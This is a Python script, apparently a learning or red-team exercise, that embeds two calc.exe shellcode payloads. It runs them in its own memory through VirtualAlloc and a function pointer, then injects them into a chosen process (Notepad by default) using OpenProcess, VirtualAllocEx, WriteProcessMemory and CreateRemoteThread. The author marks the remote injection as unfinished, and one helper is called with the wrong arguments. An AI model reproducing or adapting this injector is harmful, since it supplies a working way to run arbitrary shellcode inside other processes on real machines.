import ctypes
from ctypes import wintypes as w

# No encoder specified, outputting raw payload
# Payload size: 276 bytes
# Final size of py file: 1357 bytes
buf = b""
buf += b"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41"
buf += b"\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48"
buf += b"\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f"
buf += b"\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c"
buf += b"\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52"
buf += b"\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b"
buf += b"\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0"
buf += b"\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56"
buf += b"\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9"
buf += b"\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0"
buf += b"\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58"
buf += b"\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44"
buf += b"\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0"
buf += b"\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
buf += b"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
buf += b"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00"
buf += b"\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41"
buf += b"\xba\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41"
buf += b"\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06"
buf += b"\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a"
buf += b"\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c\x63\x2e\x65"
buf += b"\x78\x65\x00"

# No encoder specified, outputting raw payload
# Payload size: 193 bytes
# Final size of py file: 948 bytes
buff = b""
buff += b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b"
buff += b"\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7"
buff += b"\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf"
buff += b"\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c"
buff += b"\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01"
buff += b"\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31"
buff += b"\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d"
buff += b"\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66"
buff += b"\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0"
buff += b"\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f"
buff += b"\x5f\x5a\x8b\x12\xeb\x8d\x5d\x6a\x01\x8d\x85\xb2\x00"
buff += b"\x00\x00\x50\x68\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5"
buff += b"\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a"
buff += b"\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53"
buff += b"\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00"

shellcode = buff

# GLOBALs DLLs for CreateToolhelp32Snapshot, Process32First, and Process32Next. Also for OpenProcess, VirtualAllocEx,
# WriteProcessMemory, CreateRemoteThread
h_kernel32 = ctypes.WinDLL("Kernel32.dll")
MAX_PATH = w.MAX_PATH
# for OpenProcess()
PROCESS_ALL_ACCESS = (0x00F000 | 0x00100000 | 0xFFF)

'''
typedef struct tagPROCESSENTRY32 {
  DWORD     dwSize;  # The size of the structure, in bytes. Before calling the Process32First function, set this member 
                        to sizeof(PROCESSENTRY32). If you do not initialize dwSize, Process32First fails.
  DWORD     cntUsage;
  DWORD     th32ProcessID;
  ULONG_PTR th32DefaultHeapID;
  DWORD     th32ModuleID;
  DWORD     cntThreads;
  DWORD     th32ParentProcessID;
  LONG      pcPriClassBase;
  DWORD     dwFlags;
  CHAR      szExeFile[MAX_PATH];
} PROCESSENTRY32;
'''


class PROCESSENTRY32(ctypes.Structure):
    _fields_ = [
        ("dwSize", w.DWORD),  # The calling application must set the dwSize member of PROCESSENTRY32 to the size,
        # in bytes, of the structure.
        ("cntUsage", w.DWORD),  # This member is no longer used and is always set to zero.
        ("th32ProcessID", w.DWORD),
        ("th32DefaultHeapID", w.PULONG),  # This member is no longer used and is always set to zero.
        ("th32ModuleID", w.DWORD),  # This member is no longer used and is always set to zero.
        ("cntThreads", w.DWORD),
        ("th32ParentProcessID", w.DWORD),
        ("pcPriClassBase", w.LONG),
        ("dwFlags", w.DWORD),  # This member is no longer used and is always set to zero.
        ("szExeFile", w.CHAR * MAX_PATH)  # char * MAX_PATH for wanted size of char[] (260)
    ]


# FUNCs
def create_toolhelp32_snapshot() -> w.HANDLE:
    '''
    HANDLE CreateToolhelp32Snapshot(
    [in] DWORD dwFlags,  # TH32CS_SNAPPROCESS, 0x00000002, Includes all processes in the system in the snapshot. To
                            enumerate the processes, see Process32First.
    [in] DWORD th32ProcessID  # ignored for my purposes of returning all processes
    );
    If the function succeeds, it returns an open handle to the specified snapshot.
    If the function fails, it returns INVALID_HANDLE_VALUE. To get extended error information, call GetLastError.
    Possible error codes include ERROR_BAD_LENGTH.
    [*] DLL	Kernel32.dll
    '''
    print("[+] Creating the Toolhelp32 Snapshot")
    dwFlags = 0x00000002
    th32ProcessID = None
    h_resp = h_kernel32.CreateToolhelp32Snapshot(dwFlags, th32ProcessID)
    if h_resp < 0:
        find_last_error("create_toolhelp32_snapshot")
    return h_resp


def process32_first(p_handle: w.HANDLE) -> PROCESSENTRY32:
    '''
    BOOL Process32First(
    [in]      HANDLE           hSnapshot,
    [in, out] LPPROCESSENTRY32 lppe  # A pointer to a PROCESSENTRY32 structure
    );
    Returns TRUE if the first entry of the process list has been copied to the buffer or FALSE otherwise. The
    ERROR_NO_MORE_FILES error value is returned by the GetLastError function if no processes exist or the snapshot
    does not contain process information.
    DLL	Kernel32.dll
    '''
    print(f"[+] Retrieving the first Process with HANDLE: {p_handle}")
    hSnapshot = p_handle
    # initialize and fill out the PROCESSENTRY32 Structure required to pass and receive each processes' information
    LPPROCESSENTRY32 = PROCESSENTRY32()
    # LPPROCESSENTRY32.szExeFile = MAX_PATH
    LPPROCESSENTRY32.dwSize = ctypes.sizeof(LPPROCESSENTRY32)
    bool_resp = h_kernel32.Process32First(hSnapshot, ctypes.byref(LPPROCESSENTRY32))
    if not bool_resp:
        find_last_error("process32_first")
    return LPPROCESSENTRY32


def process32_next(process_entry32: PROCESSENTRY32, h_processes: w.HANDLE) -> bool:
    '''
    BOOL Process32Next(
    [in]  HANDLE           hSnapshot,
    [out] LPPROCESSENTRY32 lppe
    );
    Returns TRUE if the next entry of the process list has been copied to the buffer or FALSE otherwise. The
    ERROR_NO_MORE_FILES error value is returned by the GetLastError function if no processes exist or the snapshot
    does not contain process information.
    DLL	Kernel32.dll
    '''
    hSnapshot = h_processes
    LPPROCESSENTRY32 = process_entry32
    bool_resp = h_kernel32.Process32Next(hSnapshot, ctypes.byref(LPPROCESSENTRY32))
    if not bool_resp:
        find_last_error("process32_first")
    return bool_resp


# function to return the last error if needed when looking at WinAPI return values
def find_last_error(func_name: str):
    error = h_kernel32.GetLastError()
    if error != 0:
        print(f"{func_name} had an error. Error Code: {error}")
        exit(1)
    else:
        print(f"[+] Last Error check from {func_name} found no ERRORs!")


def get_handle_to_open_process_by_pid(proc_id: int) -> int:
    print(f"[+] Getting handle to process with pid {proc_id}")
    # global var created
    dwDesiredAccess = PROCESS_ALL_ACCESS
    bInheritHandle = False
    # convert decimal to hex string and then convert back to base 16 (hex) int
    dwProcessId = int(hex(proc_id), 16)
    response = h_kernel32.OpenProcess(dwDesiredAccess, bInheritHandle, dwProcessId)
    if response <= 0:
        find_last_error("get_handle_to_open_process")
    print(f"\t- handle was created: {response}, so now its time to INJECT it!")
    return response


def virtual_alloc_ex(h_process, dll_size):
    '''
    LPVOID VirtualAllocEx(
    [in]           HANDLE hProcess,
    [in, optional] LPVOID lpAddress,
    [in]           SIZE_T dwSize,
    [in]           DWORD  flAllocationType,
    [in]           DWORD  flProtect
    );
    If the function succeeds, the return value is the base address of the allocated region of pages.
    If the function fails, the return value is NULL. To get extended error information, call GetLastError.
    DLL	Kernel32.dll
    '''
    print("[+] Allocating memory in Remote Process before writing DLL to Remote Memory")
    hProcess = h_process
    lpAddress = None
    dwSize = w.DWORD(dll_size)
    flAllocationType = (
            0x1000 | 0x2000)  # (0x00001000 | 0x00002000)  # To reserve and commit pages in one step,
    # call VirtualAllocEx with
    # MEM_COMMIT | MEM_RESERVE.
    flProtect = 0x40  # 0x40 PAGE_EXECUTE_READWRITE 0x40, committed region of pages.
    b_address = h_kernel32.VirtualAllocEx(hProcess, lpAddress, dwSize, flAllocationType, flProtect)
    if b_address <= 0 or b_address is None:
        find_last_error("virtual_alloc_ex")
    print(f"\t - memory allocated successfully! Base Address in Remote Process to write to: {b_address}")
    return b_address


def write_process_memory(h_process, base_address, shellcode_buffer):
    '''
    BOOL WriteProcessMemory(
    [in]  HANDLE  hProcess,
    [in]  LPVOID  lpBaseAddress,
    [in]  LPCVOID lpBuffer,
    [in]  SIZE_T  nSize,
    [out] SIZE_T  *lpNumberOfBytesWritten
    );
    If the function succeeds, the return value is nonzero.
    If the function fails, the return value is 0 (zero).
    DLL	Kernel32.dll
    '''
    print(f"[+] Writing {shellcode_buffer} to Remote Process at base address: {base_address}")
    # creating a buffer for my base address
    # buf = ctypes.create_string_buffer(str(base_address).decode())
    hProcess = h_process
    lpBaseAddress = base_address
    # create the buffer of the string with built in ctypes, must first convert origianl string to bytes with bytes()
    lpBuffer = shellcode_buffer
    nSize = len(shellcode_buffer)
    lpNumberOfBytesWritten = None
    resp = h_kernel32.WriteProcessMemory(hProcess, lpBaseAddress, lpBuffer, nSize, lpNumberOfBytesWritten)
    if resp == 0 or resp is None:
        find_last_error("write_process_memory()")
    return


def create_remote_thread(h_process, base_address, proc_name):
    '''
    HANDLE CreateRemoteThreadEx(
    [in]            HANDLE                       hProcess,
    [in, optional]  LPSECURITY_ATTRIBUTES        lpThreadAttributes, optional so setting to NULL for now
    [in]            SIZE_T                       dwStackSize,  # The initial size of the stack, in bytes. The system
                                                               # rounds this value to the nearest page. If this
                                                               # parameter is 0 (zero), the new thread uses the default
                                                               # size for the executable.
    [in]            LPTHREAD_START_ROUTINE       lpStartAddress,
    [in, optional]  LPVOID                       lpParameter,
    [in]            DWORD                        dwCreationFlags,
    [out, optional] LPDWORD                      lpThreadId
    );
    If the function succeeds, the return value is a handle to the new thread.
    If the function fails, the return value is NULL. To get extended error information, call GetLastError.
    DLL	Kernel32.dll
    '''
    print(f"[+] Starting a Remote Thread for SHELLCODE in {proc_name}")
    hProcess = h_process
    lpThreadAttributes = None
    dwStackSize = 0
    lpStartAddress = base_address
    lpParameter = None
    # buffer_dll_path = dll_path.encode('utf-8')
    # lpParameter = buffer_dll_path
    dwCreationFlags = 0  # 0, The thread runs immediately after creation.
    lpAttributeList = None
    # buffer for return value of thread ID to verify it was actually created (not just rely on NO ERRORs)
    thread_id = ctypes.c_ulong(0)
    lpThreadId = thread_id
    # Create at thread at the base address of the shellcode
    remoteData = h_kernel32.CreateRemoteThread(hProcess, lpThreadAttributes, dwStackSize, lpStartAddress, lpParameter,
                                               dwCreationFlags, ctypes.byref(lpThreadId))
    # DLL FULL PATH Version of CreateRemoteThread() call
    # remoteData = h_kernel32.CreateRemoteThread(hProcess, lpThreadAttributes, dwStackSize, lpStartAddress,
    #                                          ctypes.create_string_buffer(lpParameter),
    #                                           dwCreationFlags, ctypes.byref(lpThreadId))
    if remoteData == 0 or remoteData is None:
        find_last_error("create_remote_thread()")
    print(f"[+] Remote Thread with ID {lpThreadId.value} created!")
    return


def simple_dll_injection(dll_path, proc_to_inject):
    h_processes = create_toolhelp32_snapshot()
    print(f"\t - handle to processes created successfully: {h_processes}")
    LPPROCESSENTRY32 = process32_first(h_processes)
    first_proc = LPPROCESSENTRY32.szExeFile.decode('utf-8')
    first_proc = first_proc.replace("[", "").replace("]", "")
    print(f"\t - First Process received successfully, procname = {first_proc}")
    while True:
        process32_next(LPPROCESSENTRY32, h_processes)
        next_proc = LPPROCESSENTRY32.szExeFile.decode('utf-8')
        next_proc = next_proc.replace("[", "").replace("]", "")
        print(f"\t - Next Process received successfully, procname = {next_proc}")
        if next_proc.lower() == proc_to_inject.lower():
            print(f"[+] Found the process we want to inject! {next_proc} has a PID: {LPPROCESSENTRY32.th32ProcessID}")
            break
    # get a handle to the process that will be injected via it's PID found from Process32Next
    h_process = get_handle_to_open_process_by_pid(LPPROCESSENTRY32.th32ProcessID)
    # allocate memory in the remote process based on the size of the dll being injected, WinAPI rounds up for us
    dll_name_size = len(dll_path) + 20  # returns an int in bytes
    base_address = virtual_alloc_ex(h_process, dll_name_size)
    write_process_memory(h_process, base_address, dll_path)
    create_remote_thread(h_process, base_address, proc_to_inject, dll_path)
    return


def remote_shellcode_injection(sc, proc_to_inject):
    h_processes = create_toolhelp32_snapshot()
    print(f"\t - handle to processes created successfully: {h_processes}")
    LPPROCESSENTRY32 = process32_first(h_processes)
    first_proc = LPPROCESSENTRY32.szExeFile.decode('utf-8')
    first_proc = first_proc.replace("[", "").replace("]", "")
    print(f"\t - First Process received successfully, procname = {first_proc}")
    while True:
        process32_next(LPPROCESSENTRY32, h_processes)
        next_proc = LPPROCESSENTRY32.szExeFile.decode('utf-8')
        next_proc = next_proc.replace("[", "").replace("]", "")
        print(f"\t - Next Process received successfully, procname = {next_proc}")
        if next_proc.lower() == proc_to_inject.lower():
            print(f"[+] Found the process we want to inject! {next_proc} has a PID: {LPPROCESSENTRY32.th32ProcessID}")
            break
    # get a handle to the process that will be injected via it's PID found from Process32Next
    h_process = get_handle_to_open_process_by_pid(LPPROCESSENTRY32.th32ProcessID)
    # allocate memory in the remote process based on the size of the dll being injected, WinAPI rounds up for us
    # create shellcode buffer and get its size to pass to VirtualAllocEx
    shellcode_buffer = ctypes.create_string_buffer(sc, len(shellcode))
    length = len(shellcode_buffer)
    base_address = virtual_alloc_ex(h_process, length)
    write_process_memory(h_process, base_address, shellcode_buffer)
    create_remote_thread(h_process, base_address, proc_to_inject)
    return


def create_local_shellcode_runner_function(sc: bytes):
    # create a buffer in memory
    shellcode_buffer = ctypes.create_string_buffer(sc, len(shellcode))
    # create a function pointer to our shellcode
    length = len(shellcode_buffer)
    # VirtualAlloc used to allocate memory, lpAddress = None so "the system determines where to allocate the region"
    # flAllocationType 0x1000 | 0x2000 is for MEM_COMMIT and MEM_RESERVE, flProtect 0x40 is for PAGE_EXECUTE_READWRITE
    ptr = ctypes.windll.kernel32.VirtualAlloc(None, length, 0x1000 | 0x2000, 0x40)
    ctypes.windll.kernel32.RtlMoveMemory(ptr, shellcode_buffer, length)
    shellcode_func = ctypes.cast(ptr, ctypes.CFUNCTYPE(None))
    print(f"shellcode_func type = {type(shellcode_func)}")
    return shellcode_func


def start_remote_shellcode_runner(sc: bytes):
    proc_to_inject = input("What process would you like to inject into? NOTE: DEFAULT is Notepad.exe\n")
    if len(proc_to_inject) < 2:
        proc_to_inject = "Notepad.exe"
    print(f"[+] Injecting SHELLCODE into '{proc_to_inject}'")
    remote_shellcode_injection(sc, proc_to_inject)
    # create a buffer in memory
    # shellcode_buffer = ctypes.create_string_buffer(sc, len(shellcode))
    # create a function pointer to our shellcode
    # length = len(shellcode_buffer)

    # VirtualAllocEx used to allocate memory, lpAddress = None so "the system determines where to allocate the region"
    # flAllocationType 0x1000 | 0x2000 is for MEM_COMMIT and MEM_RESERVE, flProtect 0x40 is for PAGE_EXECUTE_READWRITE
    # ptr = ctypes.windll.kernel32.VirtualAlloc(None, length, 0x1000 | 0x2000, 0x40)
    # ctypes.windll.kernel32.RtlMoveMemory(ptr, shellcode_buffer, length)
    # shellcode_func = ctypes.cast(ptr, ctypes.CFUNCTYPE(None))
    # print(f"shellcode_func type = {type(shellcode_func)}")
    # return shellcode_func

# NOTE unfinished...remote shellcode injection not working yet
def main():
    # call our shellcode
    shellcode_func = create_local_shellcode_runner_function(shellcode)
    shellcode_func()
    start_remote_shellcode_runner(shellcode)


if __name__ == "__main__":
    main()
